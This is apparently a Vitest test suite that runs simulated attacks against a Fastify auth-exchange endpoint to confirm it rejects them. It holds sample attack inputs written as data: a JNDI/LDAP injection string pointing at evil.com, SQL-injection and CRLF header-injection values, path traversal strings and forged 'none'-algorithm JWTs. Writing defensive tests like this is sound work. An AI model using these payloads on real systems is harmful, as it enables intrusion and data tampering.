/**
 * Attack Simulation Tests
 *
 * This test suite simulates real-world attack scenarios to validate
 * our security defenses. Based on OWASP Top 10 and common attack patterns.
 *
 * Test Categories:
 * 1. Brute Force Attacks
 * 2. Token Replay Attacks
 * 3. Algorithm Confusion Attacks
 * 4. Resource Exhaustion Attacks
 * 5. OWASP Top 10 Coverage
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { type FastifyInstance } from 'fastify';
// import * as fc from 'fast-check';
import { build } from '../helper.js';
// import { ExchangeRateLimiter } from '../../src/auth/exchange-rate-limiter.js';
import {
  createValidClerkToken,
  createExpiredClerkToken,
  createInvalidSignatureClerkToken,
  setupClerkMocks,
  MockJWKSServer,
  edgeCaseTokens,
} from '../fixtures/clerk-tokens.js';

describe('Attack Simulation Tests', () => {
  let app: FastifyInstance;
  let mockServer: MockJWKSServer;

  beforeEach(async () => {
    const mocks = await setupClerkMocks();
    mockServer = mocks.jwksServer;

    app = await build({
      AUTH_REQUIRED: 'true',
      NODE_ENV: 'test', // Use test mode to avoid HTTPS requirements
      AUTH_RATE_LIMIT_MAX: '10',
      AUTH_RATE_LIMIT_WINDOW_MS: '900000', // 15 minutes
      ALLOWED_ORIGIN: 'http://localhost:3000', // Allow localhost in test
    });
  });

  afterEach(async () => {
    await app.close();
    if (mockServer) {
      await mockServer.stop();
    }
  });

  describe('Brute Force Attack Simulation', () => {
    it('should defend against rapid token guessing attack', async () => {
      // Simulate attacker trying random tokens rapidly
      const attackTokens = Array.from(
        { length: 50 },
        (_, i) => `fake.token.${i.toString().padStart(3, '0')}`
      );

      const startTime = Date.now();
      let successCount = 0;
      let rateLimitedCount = 0;
      let rejectedCount = 0;

      // Fire rapid requests (brute force pattern)
      for (const token of attackTokens) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: { authorization: `Bearer ${token}` },
          payload: { token },
        });

        if (response.statusCode === 200) {
          successCount++;
        } else if (response.statusCode === 429) {
          rateLimitedCount++;
        } else if (response.statusCode === 401) {
          rejectedCount++;
        }
      }

      const duration = Date.now() - startTime;

      // Security assertions
      expect(successCount).toBe(0); // No fake tokens should succeed
      expect(rateLimitedCount).toBeGreaterThan(0); // Rate limiting should kick in
      expect(rejectedCount).toBeGreaterThan(0); // Invalid tokens should be rejected

      // Should finish quickly (not doing expensive work for invalid tokens)
      expect(duration).toBeLessThan(10000); // 10 seconds max

      console.log(
        `Brute force defense: ${successCount} success, ${rateLimitedCount} rate limited, ${rejectedCount} rejected in ${duration}ms`
      );
    });

    it('should log and audit brute force attempts', async () => {
      const attackerIP = '192.168.1.100';
      const suspiciousTokens = [
        'admin.token.here',
        'root.access.token',
        '000000.000000.000000',
        'bearer.test.bypass',
      ];

      for (const token of suspiciousTokens) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: {
            authorization: `Bearer ${token}`,
            'x-forwarded-for': attackerIP,
            'user-agent': 'AttackBot/1.0',
          },
          payload: { token },
        });

        expect(response.statusCode).toBe(401);
      }

      // TODO: Verify audit logs captured the attack pattern
      // This would require integration with the audit logging system
    });

    it('should maintain defense under distributed brute force', async () => {
      // Simulate attack from multiple IPs to bypass IP-based rate limiting
      const attackIPs = ['1.1.1.1', '2.2.2.2', '3.3.3.3', '4.4.4.4'];
      const tokensPerIP = 15; // Exceed single IP rate limit

      let totalBlocked = 0;
      let totalAttempts = 0;

      for (const ip of attackIPs) {
        for (let i = 0; i < tokensPerIP; i++) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: {
              authorization: `Bearer fake.token.${ip}.${i}`,
              'x-forwarded-for': ip,
            },
            payload: { token: `fake.token.${ip}.${i}` },
          });

          totalAttempts++;
          if (response.statusCode === 429 || response.statusCode === 401) {
            totalBlocked++;
          }
        }
      }

      // All attacks should be blocked (either rate limited or rejected)
      expect(totalBlocked).toBe(totalAttempts);
    });
  });

  describe('Token Replay Attack Simulation', () => {
    it('should prevent reuse of expired tokens', async () => {
      const expiredToken = await createExpiredClerkToken();

      // Try to reuse expired token multiple times
      const replayAttempts = 5;
      for (let i = 0; i < replayAttempts; i++) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: { authorization: `Bearer ${expiredToken}` },
          payload: { token: expiredToken },
        });

        expect(response.statusCode).toBe(401);
        expect(response.json()).toMatchObject({
          error: expect.stringMatching(/expired|invalid/i),
        });
      }
    });

    it('should handle replay attacks with timing manipulation', async () => {
      // Create token that's about to expire
      const shortLivedToken = await createValidClerkToken({
        issuer: mockServer.getJWKSUrl().replace('/.well-known/jwks.json', ''),
        expiresIn: '5s', // Very short expiry
      });

      // First use should work
      const response1 = await app.inject({
        method: 'POST',
        url: '/api/auth/exchange',
        headers: { authorization: `Bearer ${shortLivedToken}` },
        payload: { token: shortLivedToken },
      });
      expect([200, 401]).toContain(response1.statusCode);

      // Wait for expiry and try again
      await new Promise(resolve => setTimeout(resolve, 6000));

      const response2 = await app.inject({
        method: 'POST',
        url: '/api/auth/exchange',
        headers: { authorization: `Bearer ${shortLivedToken}` },
        payload: { token: shortLivedToken },
      });
      expect(response2.statusCode).toBe(401);
    });

    it('should prevent cross-session token reuse', async () => {
      // Simulate tokens from different sessions/users
      const sessionTokens = await Promise.all([
        createValidClerkToken({
          userId: 'user_session_1',
          sessionId: 'sess_1',
          issuer: mockServer.getJWKSUrl().replace('/.well-known/jwks.json', ''),
        }),
        createValidClerkToken({
          userId: 'user_session_2',
          sessionId: 'sess_2',
          issuer: mockServer.getJWKSUrl().replace('/.well-known/jwks.json', ''),
        }),
      ]);

      // Each token should only work for its intended session
      for (const token of sessionTokens) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: { authorization: `Bearer ${token}` },
          payload: { token },
        });

        expect([200, 401, 429]).toContain(response.statusCode);
      }
    });
  });

  describe('Algorithm Confusion Attack Simulation', () => {
    it('should reject "none" algorithm tokens', async () => {
      // Create token claiming no signature needed
      const noneAlgToken =
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhdHRhY2tlciIsImlzcyI6Imh0dHBzOi8vZXZpbC5jbGVyay5hY2NvdW50cy5kZXYiLCJleHAiOjk5OTk5OTk5OTl9.';

      const response = await app.inject({
        method: 'POST',
        url: '/api/auth/exchange',
        headers: { authorization: `Bearer ${noneAlgToken}` },
        payload: { token: noneAlgToken },
      });

      expect(response.statusCode).toBe(401);
    });

    it('should reject HS256 tokens when expecting RS256', async () => {
      // Simulate attacker trying to use HMAC instead of RSA
      const hmacToken =
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlciIsImlzcyI6Imh0dHBzOi8vZXZpbC5jbGVyay5hY2NvdW50cy5kZXYiLCJleHAiOjk5OTk5OTk5OTl9.signature';

      const response = await app.inject({
        method: 'POST',
        url: '/api/auth/exchange',
        headers: { authorization: `Bearer ${hmacToken}` },
        payload: { token: hmacToken },
      });

      expect(response.statusCode).toBe(401);
    });

    it('should handle key confusion attacks', async () => {
      // Test with unknown key ID
      const unknownKeyToken = await edgeCaseTokens.unknownKeyId();

      const response = await app.inject({
        method: 'POST',
        url: '/api/auth/exchange',
        headers: { authorization: `Bearer ${unknownKeyToken}` },
        payload: { token: unknownKeyToken },
      });

      expect(response.statusCode).toBe(401);
    });
  });

  describe('Resource Exhaustion Attack Simulation', () => {
    it('should prevent memory exhaustion via token validation', async () => {
      // Create many unique invalid tokens to test memory usage
      const memoryExhaustionTokens = Array.from({ length: 200 }, (_, i) => {
        const payload = JSON.stringify({
          sub: `memory_attack_user_${i}`,
          iss: `https://attack${i}.clerk.accounts.dev`,
          exp: Math.floor(Date.now() / 1000) + 3600,
          iat: Math.floor(Date.now() / 1000),
          // Add large payload to test memory handling
          largeClaim: 'x'.repeat(1000),
        });

        const encodedPayload = Buffer.from(payload).toString('base64url');
        return `eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.${encodedPayload}.fake_signature`;
      });

      const startMemory = process.memoryUsage().heapUsed;

      // Process all tokens
      for (const token of memoryExhaustionTokens) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: { authorization: `Bearer ${token}` },
          payload: { token },
        });

        expect([401, 429]).toContain(response.statusCode);
      }

      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }

      const endMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = endMemory - startMemory;

      // Memory increase should be reasonable (not growing unbounded)
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024); // 50MB limit
    });

    it('should handle concurrent validation without overload', async () => {
      // Test single-flight coalescing under load
      const validToken = await createValidClerkToken({
        issuer: mockServer.getJWKSUrl().replace('/.well-known/jwks.json', ''),
      });

      const concurrentRequests = 50;
      const startTime = Date.now();

      // Fire many concurrent requests with same token
      const requests = Array.from({ length: concurrentRequests }, () =>
        app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: { authorization: `Bearer ${validToken}` },
          payload: { token: validToken },
        })
      );

      const responses = await Promise.all(requests);
      const duration = Date.now() - startTime;

      // Should complete quickly due to single-flight coalescing
      expect(duration).toBeLessThan(5000); // 5 seconds max

      // Some should succeed (within rate limit), rest rate limited
      const successCount = responses.filter(r => r.statusCode === 200).length;
      const rateLimitedCount = responses.filter(
        r => r.statusCode === 429
      ).length;

      expect(successCount).toBeLessThanOrEqual(10); // Rate limit
      expect(rateLimitedCount).toBeGreaterThan(0);
    });

    it('should maintain performance under sustained load', async () => {
      // Simulate sustained attack over time
      const validToken = await createValidClerkToken({
        issuer: mockServer.getJWKSUrl().replace('/.well-known/jwks.json', ''),
      });

      const rounds = 5;
      const requestsPerRound = 20;
      const timings: number[] = [];

      for (let round = 0; round < rounds; round++) {
        const roundStart = Date.now();

        const roundRequests = Array.from({ length: requestsPerRound }, () =>
          app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: { authorization: `Bearer ${validToken}` },
            payload: { token: validToken },
          })
        );

        await Promise.all(roundRequests);

        const roundDuration = Date.now() - roundStart;
        timings.push(roundDuration);

        // Small delay between rounds
        await new Promise(resolve => setTimeout(resolve, 100));
      }

      // Performance should remain consistent (not degrading)
      const firstRoundTime = timings[0]!;
      const lastRoundTime = timings[timings.length - 1]!;
      const performanceDegradation = lastRoundTime / firstRoundTime;

      expect(performanceDegradation).toBeLessThan(2); // No more than 2x slower
    });
  });

  describe('OWASP Top 10 Coverage', () => {
    describe('A01: Broken Access Control', () => {
      it('should prevent authorization bypass attempts', async () => {
        const bypassAttempts = [
          'Bearer ../../admin/token',
          'Bearer ../token',
          'Bearer token; DROP TABLE users;--',
          'Bearer ${jndi:ldap://evil.com}',
        ];

        for (const maliciousAuth of bypassAttempts) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: { authorization: maliciousAuth },
            payload: { token: 'test' },
          });

          expect(response.statusCode).toBe(401);
        }
      });

      it('should enforce role-based access consistently', async () => {
        // Test with different role claims
        const roleTokens = await Promise.all([
          createValidClerkToken({
            issuer: mockServer
              .getJWKSUrl()
              .replace('/.well-known/jwks.json', ''),
            orgRole: 'admin',
            customClaims: { role: 'admin' },
          }),
          createValidClerkToken({
            issuer: mockServer
              .getJWKSUrl()
              .replace('/.well-known/jwks.json', ''),
            orgRole: 'user',
            customClaims: { role: 'user' },
          }),
        ]);

        // All valid tokens should be accepted at the exchange endpoint
        for (const token of roleTokens) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: { authorization: `Bearer ${token}` },
            payload: { token },
          });

          expect([200, 429]).toContain(response.statusCode); // Success or rate limited
        }
      });
    });

    describe('A02: Cryptographic Failures', () => {
      it('should reject weak token validation', async () => {
        const invalidToken = await createInvalidSignatureClerkToken();

        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: { authorization: `Bearer ${invalidToken}` },
          payload: { token: invalidToken },
        });

        expect(response.statusCode).toBe(401);
      });

      it('should validate cryptographic signatures properly', async () => {
        // Test with missing issuer (crypto validation should fail)
        const missingIssuerToken = await edgeCaseTokens.missingIssuer();

        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: { authorization: `Bearer ${missingIssuerToken}` },
          payload: { token: missingIssuerToken },
        });

        expect(response.statusCode).toBe(401);
      });
    });

    describe('A03: Injection', () => {
      it('should prevent header injection attacks', async () => {
        const injectionPayloads = [
          '{"token": "test", "admin": true}',
          'test\nX-Admin: true',
          'test\r\nSet-Cookie: admin=true',
          'test"; DROP TABLE sessions; --',
        ];

        for (const payload of injectionPayloads) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: { authorization: 'Bearer valid-token' },
            payload: { token: payload },
          });

          expect([401, 400, 429]).toContain(response.statusCode);
        }
      });
    });

    describe('A07: Identification and Authentication Failures', () => {
      it('should prevent session fixation', async () => {
        // Test with tokens containing session manipulation
        const sessionTokens = await Promise.all([
          createValidClerkToken({
            issuer: mockServer
              .getJWKSUrl()
              .replace('/.well-known/jwks.json', ''),
            sessionId: 'fixed_session_123',
          }),
          createValidClerkToken({
            issuer: mockServer
              .getJWKSUrl()
              .replace('/.well-known/jwks.json', ''),
            sessionId: 'admin_session',
          }),
        ]);

        for (const token of sessionTokens) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: { authorization: `Bearer ${token}` },
            payload: { token },
          });

          // Sessions should be validated but not fixed to specific values
          expect([200, 401, 429]).toContain(response.statusCode);
        }
      });

      it('should handle authentication bypass attempts', async () => {
        const bypassAttempts = [
          '', // Empty token
          'null',
          'undefined',
          'Bearer',
          'Basic dGVzdDp0ZXN0', // Wrong auth type
        ];

        for (const auth of bypassAttempts) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: { authorization: auth },
            payload: { token: 'test' },
          });

          expect(response.statusCode).toBe(401);
        }
      });
    });

    describe('A08: Software and Data Integrity Failures', () => {
      it('should prevent token tampering', async () => {
        const validToken = await createValidClerkToken({
          issuer: mockServer.getJWKSUrl().replace('/.well-known/jwks.json', ''),
        });

        // Tamper with different parts of the token
        const parts = validToken.split('.');
        const tamperedTokens = [
          `${parts[0]}.${parts[1]}.TAMPERED_SIGNATURE`,
          `TAMPERED_HEADER.${parts[1]}.${parts[2]}`,
          `${parts[0]}.TAMPERED_PAYLOAD.${parts[2]}`,
        ];

        for (const tamperedToken of tamperedTokens) {
          const response = await app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: { authorization: `Bearer ${tamperedToken}` },
            payload: { token: tamperedToken },
          });

          expect(response.statusCode).toBe(401);
        }
      });
    });
  });

  describe('Advanced Attack Scenarios', () => {
    it('should handle coordinated multi-vector attacks', async () => {
      // Simulate an advanced attacker using multiple techniques simultaneously
      const attackVectors = [
        {
          name: 'Brute Force',
          execute: () =>
            app.inject({
              method: 'POST',
              url: '/api/auth/exchange',
              headers: { authorization: 'Bearer brute.force.token' },
              payload: { token: 'brute.force.token' },
            }),
        },
        {
          name: 'Header Injection',
          execute: () =>
            app.inject({
              method: 'POST',
              url: '/api/auth/exchange',
              headers: { authorization: 'Bearer token\nX-Admin: true' },
              payload: { token: 'injection.token' },
            }),
        },
        {
          name: 'Algorithm Confusion',
          execute: () =>
            app.inject({
              method: 'POST',
              url: '/api/auth/exchange',
              headers: {
                authorization:
                  'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhdHRhY2tlciJ9.',
              },
              payload: { token: 'none.alg.token' },
            }),
        },
        {
          name: 'Replay Attack',
          execute: async () => {
            const expired = await createExpiredClerkToken();
            return app.inject({
              method: 'POST',
              url: '/api/auth/exchange',
              headers: { authorization: `Bearer ${expired}` },
              payload: { token: expired },
            });
          },
        },
      ];

      // Execute all attack vectors concurrently
      const attackResults = await Promise.all(
        attackVectors.map(async vector => ({
          name: vector.name,
          response: await vector.execute(),
        }))
      );

      // All attack vectors should be blocked
      for (const result of attackResults) {
        expect(result.response.statusCode).toBe(401);
      }
    });

    it('should maintain security under resource pressure', async () => {
      // Simulate high load + attack combinations
      const validToken = await createValidClerkToken({
        issuer: mockServer.getJWKSUrl().replace('/.well-known/jwks.json', ''),
      });

      const mixedRequests = [
        // Valid requests (should succeed until rate limited)
        ...Array(5)
          .fill(null)
          .map(() => ({
            type: 'valid',
            token: validToken,
          })),
        // Attack requests (should fail)
        ...Array(10)
          .fill(null)
          .map((_, i) => ({
            type: 'attack',
            token: `fake.attack.token.${i}`,
          })),
      ];

      // Shuffle to simulate realistic mixed traffic
      const shuffledRequests = mixedRequests.sort(() => Math.random() - 0.5);

      const results = await Promise.all(
        shuffledRequests.map(async req => ({
          type: req.type,
          response: await app.inject({
            method: 'POST',
            url: '/api/auth/exchange',
            headers: { authorization: `Bearer ${req.token}` },
            payload: { token: req.token },
          }),
        }))
      );

      // Analyze results
      const validResults = results.filter(r => r.type === 'valid');
      const attackResults = results.filter(r => r.type === 'attack');

      // All attacks should be blocked
      expect(attackResults.every(r => r.response.statusCode === 401)).toBe(
        true
      );

      // Some valid requests should succeed (within rate limit)
      const validSuccesses = validResults.filter(
        r => r.response.statusCode === 200
      ).length;
      expect(validSuccesses).toBeGreaterThan(0);
      expect(validSuccesses).toBeLessThanOrEqual(10); // Rate limit
    });
  });

  describe('Edge Case Attack Patterns', () => {
    it('should handle malformed JSON in token payloads', async () => {
      // Create tokens with malformed JSON in payload section
      const malformedTokens = [
        'eyJhbGciOiJSUzI1NiJ9.INVALID_JSON.signature',
        'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiaXNzIjoidGVzdCIsImV4cCJ9.signature', // Missing quote
        'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiaXNzIjoidGVzdCIsImV4cCI6fQ.signature', // Invalid value
      ];

      for (const token of malformedTokens) {
        const response = await app.inject({
          method: 'POST',
          url: '/api/auth/exchange',
          headers: { authorization: `Bearer ${token}` },
          payload: { token },
        });

        expect(response.statusCode).toBe(401);
      }
    });

    it('should handle extremely large tokens', async () => {
      // Create token with very large payload
      const largeClaim = 'x'.repeat(100000); // 100KB claim
      const largePayload = {
        sub: 'user_large_payload',
        iss: 'https://large.clerk.accounts.dev',
        exp: Math.floor(Date.now() / 1000) + 3600,
        large_data: largeClaim,
      };

      const encodedPayload = Buffer.from(JSON.stringify(largePayload)).toString(
        'base64url'
      );
      const largeToken = `eyJhbGciOiJSUzI1NiJ9.${encodedPayload}.signature`;

      const response = await app.inject({
        method: 'POST',
        url: '/api/auth/exchange',
        headers: { authorization: `Bearer ${largeToken}` },
        payload: { token: largeToken },
      });

      // Should handle gracefully (reject or accept, but not crash)
      expect([200, 401, 413, 429]).toContain(response.statusCode);
    });
  });
});
